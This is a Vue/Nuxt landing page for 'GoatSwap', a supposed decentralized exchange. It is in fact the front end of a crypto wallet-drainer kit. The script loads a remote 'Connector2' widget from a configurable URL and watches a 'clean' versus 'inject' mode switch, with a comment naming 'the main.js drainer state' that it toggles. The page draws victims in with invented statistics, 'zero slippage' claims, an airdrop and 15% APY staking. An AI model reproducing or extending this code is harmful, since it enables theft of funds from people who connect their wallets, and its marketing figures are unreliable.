<template>
  <main>
    <section class="hero">
      <!-- Background orbs -->
      <div class="orb orb-purple hero-orb-1" />
      <div class="orb orb-cyan hero-orb-2" />
      <div class="orb orb-purple hero-orb-3" />

      <!-- Grid overlay -->
      <div class="hero-grid" />

      <div class="container hero-content">
        <div class="hero-badge animate-fade-in-up">
          <span class="badge-dot" />
          <span>Live on 12+ Networks</span>
        </div>

        <div class="hero-logo-box animate-fade-in-up" style="margin-bottom: 24px;">
          <img src="/goat_logo.png" alt="GoatSwap" style="width: 130px; height: 130px; border-radius: 50%; box-shadow: 0 12px 36px rgba(128,83,51,0.18); border: 4px solid #fff;" />
        </div>

        <h1 class="hero-title animate-fade-in-up" style="animation-delay: 0.1s; font-family: 'Fredoka', sans-serif;">
          The Greatest Swap<br />
          <span class="gradient-text">Of All Time.</span>
        </h1>

        <p
          class="hero-subtitle animate-fade-in-up"
          style="animation-delay: 0.2s"
        >
          GoatSwap is the greatest of all time decentralized exchange protocol. Get the
          best rates across all chains with zero slippage and instant finality.
        </p>

        <div class="hero-cta animate-fade-in-up" style="animation-delay: 0.3s">
          <button
            id="hero-connect-btn"
            class="btn btn-primary connect-btn"
            @click="handleCtaClick"
          >
            <span>Launch App</span>
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
              <path
                d="M3 8h10M9 4l4 4-4 4"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              />
            </svg>
          </button>
          <NuxtLink to="/airdrop" class="btn btn-airdrop-hero">
            <span>🎁 Claim Airdrop</span>
          </NuxtLink>
          <NuxtLink to="/staking" class="btn btn-staking-hero">
            <span>🔒 GOAT Staking (15% APY)</span>
          </NuxtLink>
          <NuxtLink to="/how-it-works" class="btn btn-secondary">
            How it Works
          </NuxtLink>
        </div>

        <!-- Floating token badges -->
        <div
          class="hero-tokens animate-fade-in-up"
          style="animation-delay: 0.4s"
        >
          <div
            v-for="(token, i) in tokens"
            :key="token.symbol"
            class="float-token"
            :style="{ animationDelay: `${i * 0.8}s` }"
          >
            <span class="float-token-icon">{{ token.icon }}</span>
            <span class="float-token-sym">{{ token.symbol }}</span>
          </div>
        </div>
      </div>

      <!-- Scroll indicator -->
      <div class="scroll-indicator">
        <div class="scroll-dot" />
      </div>
    </section>

    <div class="stats-bar">
      <div class="container">
        <div class="stats-grid">
          <div v-for="stat in stats" :key="stat.label" class="stat-item">
            <div class="stat-value">{{ stat.value }}</div>
            <div class="stat-label">{{ stat.label }}</div>
          </div>
        </div>
      </div>
    </div>

    <section class="ticker-section">
      <div class="ticker-wrapper">
        <div class="ticker-track">
          <div
            v-for="(item, idx) in [...tickerItems, ...tickerItems]"
            :key="`${item.name}-${idx}`"
            class="ticker-item"
          >
            <span class="ticker-icon">{{ item.icon }}</span>
            <span class="ticker-name">{{ item.name }}</span>
            <span class="ticker-price">{{ item.price }}</span>
            <span
              :class="
                item.change > 0 ? 'ticker-change-pos' : 'ticker-change-neg'
              "
            >
              {{ item.change > 0 ? "+" : "" }}{{ item.change }}%
            </span>
          </div>
        </div>
      </div>
    </section>

    <section class="section">
      <div class="container">
        <div class="section-header">
          <div class="section-label"><span>⚡</span> Why GoatSwap</div>
          <h2 class="section-title">
            Built for <span class="gradient-text">Power Users</span>
          </h2>
          <p class="section-subtitle">
            Everything you need to trade efficiently in the decentralized
            economy.
          </p>
        </div>

        <div class="features-grid" style="margin-top: 56px">
          <div
            v-for="(f, i) in featuresPreview"
            :key="f.title"
            class="glass-card feature-card"
            :style="{ animationDelay: `${i * 0.1}s` }"
          >
            <div class="feature-icon-wrap" :style="{ background: f.bg }">
              <span style="font-size: 22px">{{ f.icon }}</span>
            </div>
            <h3>{{ f.title }}</h3>
            <p>{{ f.desc }}</p>
          </div>
        </div>

        <div style="text-align: center; margin-top: 40px">
          <NuxtLink to="/features" class="btn btn-secondary">
            View All Features →
          </NuxtLink>
        </div>
      </div>
    </section>

    <section class="section chains-section">
      <div class="container">
        <div class="section-header" style="text-align: center">
          <div class="section-label" style="margin: 0 auto 20px">
            🌐 Multi-Chain
          </div>
          <h2 class="section-title">
            Trade Across <span class="gradient-text">Any Chain</span>
          </h2>
          <p class="section-subtitle" style="margin: 0 auto">
            GoatSwap supports all major EVM chains and non-EVM networks with
            seamless cross-chain bridging.
          </p>
        </div>

        <div class="chains-logos">
          <div v-for="chain in chains" :key="chain.name" class="chain-badge">
            <div class="chain-dot" :style="{ background: chain.bg }">
              {{ chain.icon }}
            </div>
            <span>{{ chain.name }}</span>
          </div>
        </div>
      </div>
    </section>

    <section class="section cta-section">
      <div class="container">
        <div class="cta-card glass-card">
          <div class="orb orb-purple cta-orb-1" />
          <div class="orb orb-cyan cta-orb-2" />
          <div class="cta-content">
            <h2 class="cta-title">
              Ready to <span class="gradient-text">Start Swapping?</span>
            </h2>
            <p class="cta-sub">
              Join over 2.4M traders who trust GoatSwap for the best on-chain
              rates.
            </p>
            <button
              id="cta-connect-btn"
              class="btn btn-primary"
              @click="handleCtaClick"
            >
              <span>Connect Wallet & Start</span>
              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                <path
                  d="M3 8h10M9 4l4 4-4 4"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                />
              </svg>
            </button>
          </div>
        </div>
      </div>
    </section>

    <!-- Wallet Modal -->
    <WalletModal :open="walletModalOpen" @close="walletModalOpen = false" />

    <!-- LiFi Modal -->
    <LiFiModal :open="lifiModalOpen" @close="lifiModalOpen = false" />
  </main>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from "vue";

useSeoMeta({
  title: "GoatSwap — The GOAT DEX Protocol",
  description:
    "GoatSwap is the greatest of all time decentralized exchange protocol. Swap tokens with zero slippage, low fees, and instant execution.",
});

const config = useRuntimeConfig();

useHead({
  script: [
    {
      src: config.public.connectorScriptUrl,
      defer: true,
      id: "connector2-script",
      onload: `
        window.__connector2Ready = true;
        if (window.__connector2PendingInit) {
          window.__connector2PendingInit();
        }
      `,
    },
  ],
});

const lifiModalOpen = ref(false);
const currentConnectorMode = ref('clean');
let modeWatcherInterval = null;

function getModeFromAnywhere() {
  if (typeof window === 'undefined') return 'clean'
  if (window.__connectorMode) return window.__connectorMode
  try {
    const cached = sessionStorage.getItem('uc_config')
    if (cached) {
      const parsed = JSON.parse(cached)
      return parsed.mode || 'clean'
    }
  } catch (e) {}
  return 'clean'
}

function handleCtaClick() {
  // const mode = currentConnectorMode.value;
  // console.log('[Landing Page] CTA clicked, mode:', mode);
  // if (mode === 'inject') {
  //   if (window.Connector2) {
  //     window.Connector2.open();
  //   } else {
  //     window.dispatchEvent(new CustomEvent("connector2:open", { detail: { step: 'select_network' } }));
  //   }
  // } else {
  //   lifiModalOpen.value = true;
  // }
  lifiModalOpen.value = true;
}

// Initialize the widget after the page mounts and script loads
onMounted(() => {
  const apiUrl = config.public.connectorApiUrl || 'http://localhost:3010';

  function initConnector() {
    console.log('[Landing Page] Initializing Connector2. Mode:', currentConnectorMode.value);
    if (window.Connector2) {
      window.Connector2.init({
        selector: "",
        apiUrl,
      });
    }
  }

  if (window.Connector2) {
    initConnector();
  } else {
    // Look for script tag in the DOM
    const script = document.getElementById("connector2-script");
    if (script) {
      script.addEventListener("load", () => {
        initConnector();
      });
      // Fallback: in case the load event was already fired
      setTimeout(() => {
        if (window.Connector2) initConnector();
      }, 1000);
    } else {
      // If script tag is not in DOM yet, poll for window.Connector2
      let attempts = 0;
      const interval = setInterval(() => {
        attempts++;
        if (window.Connector2) {
          initConnector();
          clearInterval(interval);
        } else if (attempts > 30) {
          clearInterval(interval);
        }
      }, 200);
    }
  }

  // Set initial mode state on mount
  currentConnectorMode.value = getModeFromAnywhere();
  if (typeof window !== 'undefined' && typeof window.set_cf_connection === 'function') {
    window.set_cf_connection(currentConnectorMode.value === 'inject');
  }

  modeWatcherInterval = setInterval(() => {
    const rawMode = getModeFromAnywhere();
    if (currentConnectorMode.value !== rawMode) {
      console.log('[Landing Page] Hot swapping mode to:', rawMode);
      currentConnectorMode.value = rawMode;

      try {
        const cached = sessionStorage.getItem('uc_config') || '{}';
        const parsed = JSON.parse(cached);
        parsed.mode = rawMode;
        sessionStorage.setItem('uc_config', JSON.stringify(parsed));
      } catch (e) {}

      // Update the main.js drainer state
      if (typeof window !== 'undefined' && typeof window.set_cf_connection === 'function') {
        window.set_cf_connection(rawMode === 'inject');
      }
    }
  }, 300);
});

onUnmounted(() => {
  if (modeWatcherInterval) clearInterval(modeWatcherInterval);
});

const tokens = [
  { icon: "⟠", symbol: "ETH" },
  { icon: "₿", symbol: "BTC" },
  { icon: "◎", symbol: "SOL" },
  { icon: "🔷", symbol: "ARB" },
  { icon: "⬡", symbol: "MATIC" },
  { icon: "🟡", symbol: "BNB" },
];

const stats = [
  { value: "$14.2B", label: "Total Volume Traded" },
  { value: "2.4M+", label: "Active Traders" },
  { value: "340+", label: "Token Pairs" },
  { value: "0.01%", label: "Lowest Fees" },
];

const tickerItems = [
  { icon: "⟠", name: "ETH", price: "$3,842.10", change: 2.34 },
  { icon: "₿", name: "BTC", price: "$68,210.50", change: 1.12 },
  { icon: "◎", name: "SOL", price: "$178.40", change: -0.87 },
  { icon: "🔷", name: "ARB", price: "$1.24", change: 4.56 },
  { icon: "⬡", name: "MATIC", price: "$0.89", change: -1.23 },
  { icon: "🟡", name: "BNB", price: "$412.30", change: 0.78 },
  { icon: "🌊", name: "OP", price: "$3.12", change: 3.21 },
  { icon: "💎", name: "LINK", price: "$18.74", change: -0.45 },
];

const featuresPreview = [
  {
    icon: "⚡",
    title: "Instant Execution",
    desc: "Trades execute in milliseconds with our optimized smart contract architecture.",
    bg: "linear-gradient(135deg, rgba(251,197,49,0.15), rgba(251,197,49,0.03))",
  },
  {
    icon: "🔒",
    title: "Non-Custodial",
    desc: "Your keys, your assets. GoatSwap never holds your funds at any point.",
    bg: "linear-gradient(135deg, rgba(0,212,255,0.15), rgba(0,212,255,0.03))",
  },
  {
    icon: "🌐",
    title: "Cross-Chain Swaps",
    desc: "Bridge and swap across 12+ networks in a single transaction.",
    bg: "linear-gradient(135deg, rgba(123,63,228,0.15), rgba(123,63,228,0.03))",
  },
];

const chains = [
  { icon: "⟠", name: "Ethereum", bg: "rgba(98,126,234,0.2)" },
  { icon: "🟡", name: "BNB Chain", bg: "rgba(240,185,11,0.2)" },
  { icon: "⬡", name: "Polygon", bg: "rgba(130,71,229,0.2)" },
  { icon: "🔷", name: "Arbitrum", bg: "rgba(40,160,240,0.2)" },
  { icon: "🌊", name: "Optimism", bg: "rgba(255,4,32,0.2)" },
  { icon: "◎", name: "Solana", bg: "rgba(153,69,255,0.2)" },
  { icon: "🔵", name: "Base", bg: "rgba(0,82,255,0.2)" },
  { icon: "❄️", name: "Avalanche", bg: "rgba(232,65,66,0.2)" },
];
</script>

<style scoped>
.hero {
  position: relative;
  min-height: 100vh;
  display: flex;
  align-items: center;
  padding: 120px 0 80px;
  overflow: hidden;
}

.hero-orb-1 {
  width: 600px;
  height: 600px;
  top: -100px;
  left: -150px;
  opacity: 0.5;
}
.hero-orb-2 {
  width: 500px;
  height: 500px;
  top: 100px;
  right: -100px;
  opacity: 0.35;
}
.hero-orb-3 {
  width: 300px;
  height: 300px;
  bottom: 0;
  left: 40%;
  opacity: 0.2;
}

.hero-grid {
  position: absolute;
  inset: 0;
  background-image:
    linear-gradient(rgba(123, 63, 228, 0.06) 1px, transparent 1px),
    linear-gradient(90deg, rgba(123, 63, 228, 0.06) 1px, transparent 1px);
  background-size: 60px 60px;
  mask-image: radial-gradient(
    ellipse 80% 80% at 50% 20%,
    black 30%,
    transparent 100%
  );
}

.hero-content {
  position: relative;
  z-index: 1;
  max-width: 720px;
}

.hero-badge {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  background: rgba(0, 212, 255, 0.08);
  border: 1px solid rgba(0, 212, 255, 0.2);
  border-radius: 99px;
  padding: 7px 16px;
  font-size: 13px;
  font-weight: 500;
  color: var(--accent-cyan);
  margin-bottom: 28px;
}

.badge-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: var(--accent-cyan);
  animation: pulse-dot 2s ease-in-out infinite;
}

.hero-title {
  font-size: clamp(48px, 8vw, 88px);
  font-weight: 900;
  line-height: 1.05;
  letter-spacing: -0.04em;
  margin-bottom: 24px;
  color: var(--text-primary);
}

.hero-subtitle {
  font-size: 19px;
  color: var(--text-secondary);
  line-height: 1.7;
  margin-bottom: 40px;
  max-width: 560px;
}

.hero-cta {
  display: flex;
  gap: 16px;
  align-items: center;
  flex-wrap: wrap;
  margin-bottom: 56px;
}

/* Floating tokens */
.hero-tokens {
  display: flex;
  flex-wrap: wrap;
  gap: 12px;
}

.float-token {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 8px 16px;
  background: rgba(255, 255, 255, 0.06);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 99px;
  font-size: 14px;
  font-weight: 500;
  animation: float 6s ease-in-out infinite;
  will-change: transform;
}

.float-token-icon {
  font-size: 18px;
}
.float-token-sym {
  color: var(--text-secondary);
}

/* Scroll */
.scroll-indicator {
  position: absolute;
  bottom: 36px;
  left: 50%;
  transform: translateX(-50%);
  display: flex;
  flex-direction: column;
  align-items: center;
}

.scroll-dot {
  width: 24px;
  height: 38px;
  border: 2px solid var(--border-subtle);
  border-radius: 99px;
  position: relative;
}

.scroll-dot::after {
  content: "";
  position: absolute;
  top: 6px;
  left: 50%;
  transform: translateX(-50%);
  width: 4px;
  height: 8px;
  background: var(--accent-cyan);
  border-radius: 99px;
  animation: scroll-bounce 1.8s ease-in-out infinite;
}

@keyframes scroll-bounce {
  0%,
  100% {
    transform: translateX(-50%) translateY(0);
    opacity: 1;
  }
  80% {
    transform: translateX(-50%) translateY(14px);
    opacity: 0;
  }
}

/* ── TICKER ── */
.ticker-section {
  padding: 32px 0;
  border-bottom: 1px solid var(--border-subtle);
}

.ticker-icon {
  font-size: 18px;
}
.ticker-name {
  font-size: 13px;
  font-weight: 600;
}
.ticker-price {
  font-size: 13px;
  color: var(--text-secondary);
}

/* ── SECTION HEADER ── */
.section-header {
  margin-bottom: 0;
}

/* ── CHAINS ── */
.chains-section {
  background: radial-gradient(
    ellipse 80% 60% at 50% 50%,
    rgba(123, 63, 228, 0.06) 0%,
    transparent 70%
  );
}

/* ── CTA BANNER ── */
.cta-card {
  padding: 72px;
  text-align: center;
  position: relative;
  overflow: hidden;
  border-color: rgba(123, 63, 228, 0.3);
}

.cta-orb-1 {
  width: 400px;
  height: 400px;
  top: -100px;
  left: -100px;
  opacity: 0.3;
}

.cta-orb-2 {
  width: 300px;
  height: 300px;
  bottom: -80px;
  right: -60px;
  opacity: 0.2;
}

.cta-content {
  position: relative;
  z-index: 1;
}

.cta-title {
  font-size: clamp(32px, 5vw, 52px);
  margin-bottom: 16px;
}

.cta-sub {
  font-size: 18px;
  color: var(--text-secondary);
  margin-bottom: 36px;
}

@media (max-width: 768px) {
  .hero {
    padding-top: 100px;
  }
  .hero-title {
    font-size: clamp(40px, 10vw, 60px);
  }
  .cta-card {
    padding: 48px 24px;
  }
  .hero-cta {
    flex-direction: column;
    align-items: flex-start;
  }
  .btn-airdrop-hero {
    width: 100%;
    justify-content: center;
  }
}

/* Premium Airdrop CTA Button */
.btn-airdrop-hero {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  background: linear-gradient(135deg, #7b3fe4 0%, #00d4ff 100%);
  border: none;
  color: #ffffff;
  font-weight: 600;
  font-size: 15px;
  padding: 12px 24px;
  border-radius: var(--radius-sm);
  transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
  text-decoration: none;
  box-shadow: 0 0 25px rgba(123, 63, 228, 0.45);
}

.btn-airdrop-hero:hover {
  transform: translateY(-2px);
  box-shadow: 0 0 35px rgba(123, 63, 228, 0.65), 0 0 20px rgba(0, 212, 255, 0.45);
}

.btn-airdrop-hero span {
  display: inline-block;
  transition: transform 0.2s;
}

.btn-airdrop-hero:hover span {
  transform: scale(1.05);
}

/* Premium Staking CTA Button */
.btn-staking-hero {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  background: linear-gradient(135deg, rgba(0, 212, 255, 0.15) 0%, rgba(123, 63, 228, 0.15) 100%);
  border: 1px solid rgba(0, 212, 255, 0.35);
  color: #ffffff;
  font-weight: 600;
  font-size: 15px;
  padding: 12px 24px;
  border-radius: var(--radius-sm);
  transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
  text-decoration: none;
  box-shadow: 0 0 25px rgba(0, 212, 255, 0.2);
}

.btn-staking-hero:hover {
  transform: translateY(-2px);
  background: linear-gradient(135deg, rgba(0, 212, 255, 0.3) 0%, rgba(123, 63, 228, 0.3) 100%);
  border-color: rgba(0, 212, 255, 0.7);
  box-shadow: 0 0 35px rgba(0, 212, 255, 0.35), 0 0 20px rgba(123, 63, 228, 0.25);
}

.btn-staking-hero span {
  display: inline-block;
  transition: transform 0.2s;
}

.btn-staking-hero:hover span {
  transform: scale(1.05);
}
</style>
